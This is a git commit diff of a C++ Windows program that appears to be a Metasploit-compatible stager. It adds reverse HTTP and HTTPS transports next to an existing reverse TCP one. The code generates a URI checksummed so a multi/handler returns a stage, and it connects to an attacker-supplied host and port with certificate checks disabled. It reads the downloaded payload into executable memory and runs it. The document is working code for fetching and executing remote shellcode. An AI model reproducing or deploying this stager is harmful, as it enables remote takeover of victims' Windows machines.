737b932d2c43c4d60df906f982d9c85ccdfcbb97
Sherif Eldeeb <archeldeeb@gmail.com>
2014-05-13 10:29:21 +0300

    reverse_hhtp(s) working

--- cee/Source.cpp
+++ cee/Source.cpp
@@ -1,18 +1,40 @@
 #include <WinSock2.h>
 #include <Windows.h>
-#pragma comment(lib, "Ws2_32.lib")
+#include <Wininet.h>
 
+#pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "wininet.lib")
+
+// Globals ...
 unsigned long uIP;
 unsigned short sPORT;
 unsigned char *buf;
 unsigned int bufSize;
 
-char* LHOST;
-char* LPORT;
 
-wchar_t *wCommandLine;
-LPWSTR *parsedArgv;
+// Functions ...
+void gen_random(char *s, const int len) { // ripped from http://stackoverflow.com/questions/440133/how-do-i-create-a-random-alpha-numeric-string-in-c
+	static const char alphanum[] =
+		"0123456789"
+		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+		"abcdefghijklmnopqrstuvwxyz";
 
+	for (int i = 0; i < len; ++i) {
+		s[i] = alphanum[rand() % (sizeof(alphanum)-1)];
+	}
+
+	s[len] = 0;
+}
+
+int TextChecksum8(char* text)
+{
+	UINT temp = 0;
+	for (UINT i = 0; i < strlen(text); i++)
+	{
+		temp += (int)text[i];
+	}
+	return temp % 0x100;
+}
 
 unsigned char* rev_tcp(char* host, char* port)
 {
@@ -69,14 +91,105 @@ unsigned char* rev_tcp(char* host, char* port)
 	return buf;
 }
 
+unsigned char* rev_http(char* host, char* port, bool WithSSL){
+	// Steps:
+	//	1) Calculate a random URI->URL with `valid` checksum; that is needed for the multi/handler to distinguish and identify various framework related requests "i.e. coming from stagers" ... we'll be asking for checksum==92 "INITM", which will get the patched stage in return. 
+	//	2) Decide about whether we're reverse_http or reverse_https, and set flags appropriately.
+	//	3) Prepare buffer for the stage with WinInet: InternetOpen, InternetConnect, HttpOpenRequest, HttpSendRequest, InternetReadFile.
+	//	4) Return pointer to the populated buffer to caller function.
+	//***************************************************************//
+	
+	// Variables
+	char URI[5] = { 0 };			//4 chars ... it can be any length actually.
+	char FullURL[6] = { 0 };	// FullURL
+	unsigned char* buffer = nullptr;
+	DWORD flags = 0;
+	int dwSecFlags = 0;
+
+	//	Step 1: Calculate a random URI->URL with `valid` checksum; that is needed for the multi/handler to distinguish and identify various framework related requests "i.e. coming from stagers" ... we'll be asking for checksum==92 "INITM", which will get the patched stage in return. 
+	int checksum = 0;
+	srand(GetTickCount());
+	while (true)				//Keep getting random values till we succeed, don't worry, computers are pretty fast and we're not asking for much.
+	{
+		gen_random(URI, 4);				//Generate a 4 char long random string ... it could be any length actually, but 4 sounds just fine.
+		checksum = TextChecksum8(URI);	//Get the 8-bit checksum of the random value
+		if (checksum == 92)		//If the checksum == 92, it will be handled by the multi/handler correctly as a "INITM" and will send over the stage.
+		{
+			break; // We found a random string that checksums to 98
+		}
+	}
+	strcpy(FullURL, "/");
+	strcat(FullURL, URI);
+
+	//	2) Decide about whether we're reverse_http or reverse_https, and set flags appropriately.
+	if (WithSSL) {
+		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA);
+	}
+	else {
+		flags = (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_UI);
+	}
+
+	//	3) Prepare buffer for the stage with WinInet:
+	//	   InternetOpen, InternetConnect, HttpOpenRequest, HttpSendRequest, InternetReadFile.
+
+	//	3.1: HINTERNET InternetOpen(_In_  LPCTSTR lpszAgent, _In_  DWORD dwAccessType, _In_  LPCTSTR lpszProxyName, _In_  LPCTSTR lpszProxyBypass, _In_  DWORD dwFlags);
+	HINTERNET hInternetOpen = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);;
+	if (hInternetOpen == NULL){
+		exit(201);
+	}
+
+	// 3.2: InternetConnect
+	HINTERNET hInternetConnect = InternetConnect(hInternetOpen, host, atoi(port), NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
+	if (hInternetConnect == NULL){
+		exit(202);
+	}
+
+	// 3.3: HttpOpenRequest
+	HINTERNET hHTTPOpenRequest = HttpOpenRequest(hInternetConnect, "GET", FullURL, NULL, NULL, NULL, flags, NULL);
+	if (hHTTPOpenRequest == NULL){
+		exit(203);
+	}
+
+	// 3.4: if (SSL)->InternetSetOption 
+	if (WithSSL){
+		dwSecFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
+		InternetSetOption(hHTTPOpenRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
+	}
+
+	// 3.5: HttpSendRequest 
+	if (!HttpSendRequest(hHTTPOpenRequest, NULL, NULL, NULL, NULL))
+	{
+		exit(204);
+	}
+
+	// 3.6: VirtualAlloc enough memory for the stage ... 4MB are more than enough
+	buffer = (unsigned char*)VirtualAlloc(NULL, (4 * 1024 * 1024), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+	// 3.7: InternetReadFile: keep reading till nothing is left.
+
+	BOOL bKeepReading = true;
+	DWORD dwBytesRead = -1;
+	DWORD dwBytesWritten = 0;
+	while (bKeepReading && dwBytesRead != 0)
+	{
+		bKeepReading = InternetReadFile(hHTTPOpenRequest, (buffer + dwBytesWritten), 4096, &dwBytesRead);
+		dwBytesWritten += dwBytesRead;
+	}
+
+	//	4) Return pointer to the populated buffer to caller function.
+	return buffer;
+}
+
 char* WcharToChar(wchar_t* orig){
 	size_t convertedChars = 0;
 	size_t origsize = wcslen(orig) + 1;
-    const size_t newsize = origsize*2;
+	const size_t newsize = origsize * 2;
 	char *nstring = (char*)VirtualAlloc(NULL, newsize, MEM_COMMIT, PAGE_READWRITE);
 	wcstombs(nstring, orig, origsize);
 	return nstring;
 }
+
+
 
 // not needed anymore ... kept for future reference :)
 //wchar_t* CharToWchar(char* orig){
@@ -88,18 +201,39 @@ char* WcharToChar(wchar_t* orig){
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int CmdShow)
 {
-	int dummy;
-	wchar_t cmd[254] = { 0 };
-	wcscpy(cmd,GetCommandLineW());
-	if (wcslen(cmd) <= 3) exit(100);
+	LPWSTR *szArglist;
+	int nArgs;
 
-	parsedArgv = CommandLineToArgvW(cmd, &dummy);
+	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
+
+	// rudimentary error checking
+	if (NULL == szArglist) { // problem parsing?
+		exit(100);
+	}
+	else if (nArgs != 4){ // less than 4 args?
+		exit(101);
+	}
 
 	// convert wchar_t to mb
-	LHOST = WcharToChar(parsedArgv[1]);
-	LPORT = WcharToChar(parsedArgv[2]);
-	
-	buf = rev_tcp(LHOST, LPORT);
+	char* TRANSPORT	= WcharToChar(szArglist[1]);
+	char* LHOST = WcharToChar(szArglist[2]);
+	char* LPORT = WcharToChar(szArglist[3]);
+
+	// pick transport ...
+	switch (TRANSPORT[0]) {
+	case '0':
+		buf = rev_tcp(LHOST, LPORT);
+		break;
+	case '1':
+		buf = rev_http(LHOST, LPORT, FALSE);
+		break;
+	case '2':
+		buf = rev_http(LHOST, LPORT, TRUE);
+		break;
+	default:
+		exit(102); // transport is not 0,1 or 2
+	}
+
 
 	(*(void(*)())buf)();
 	exit(0);
